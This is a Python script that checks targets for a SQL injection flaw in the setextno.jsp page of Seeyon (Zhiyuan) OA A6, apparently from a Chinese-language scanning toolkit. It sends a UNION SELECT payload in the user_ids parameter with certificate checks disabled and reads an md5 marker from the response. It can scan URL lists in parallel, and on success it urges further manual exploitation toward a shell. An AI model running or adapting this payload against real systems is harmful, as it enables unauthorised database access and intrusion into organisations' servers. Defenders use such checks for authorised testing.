import time
import argparse
import requests
import multiprocessing
from rich.console import Console

console = Console()


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def check(target_url):
    vuln_url = target_url + "yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999)+union+all+select+1,2,(md5(1)),4#"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    console.print(now_time() + " [INFO]     正在检测致远OA A6 setextno.jsp SQL注入Getshell漏洞", style='bold blue')
    console.print(now_time() + " [INFO]     正在请求 {}".format(vuln_url), style='bold blue')
    try:
        response = requests.get(vuln_url, headers=headers, verify=False, timeout=5)
        if response.status_code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in response.text:
            console.print(
                now_time() + " [SUCCESS]  目标 '{}' 存在致远OA A6 setextno.jsp SQL注入Getshell漏洞, 可尝试手动进一步利用".format(vuln_url),
                style='bold green')
        else:
            console.print(now_time() + " [WARNING]  致远OA A6 setextno.jsp SQL注入Getshell漏洞利用失败", style='bold yellow')
    except:
        console.print(now_time() + " [ERROR]    目标请求失败 ", style='bold red')


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    requests.packages.urllib3.disable_warnings()
    check(target_url)


if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.print('\nCTRL+C 退出', style='reverse bold red')
